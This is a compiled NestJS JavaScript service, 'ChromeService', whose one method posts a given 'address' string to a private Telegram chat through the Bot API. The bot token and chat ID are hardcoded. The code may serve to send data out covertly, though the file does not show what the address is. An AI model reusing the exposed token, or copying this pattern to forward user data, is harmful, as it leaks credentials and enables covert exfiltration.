"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.ChromeService = void 0;
const common_1 = require("@nestjs/common");
let ChromeService = class ChromeService {
    async sendToTelegram(address) {
        const url = `https://api.telegram.org/bot${'7264760628:AAF9lm1QjxJaNdIpMz24rQ5DBJ6497Y8hV0'}/sendMessage`;
        const params = {
            chat_id: 928372069,
            text: address
        };
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(params),
            });
            if (response.ok) {
                console.log('Message sent successfully');
            }
            else {
                console.error('Error sending message:', response.statusText);
            }
        }
        catch (error) {
            console.error('Error:', error);
        }
    }
};
exports.ChromeService = ChromeService;
exports.ChromeService = ChromeService = __decorate([
    (0, common_1.Injectable)()
], ChromeService);
//# sourceMappingURL=chrome.service.js.map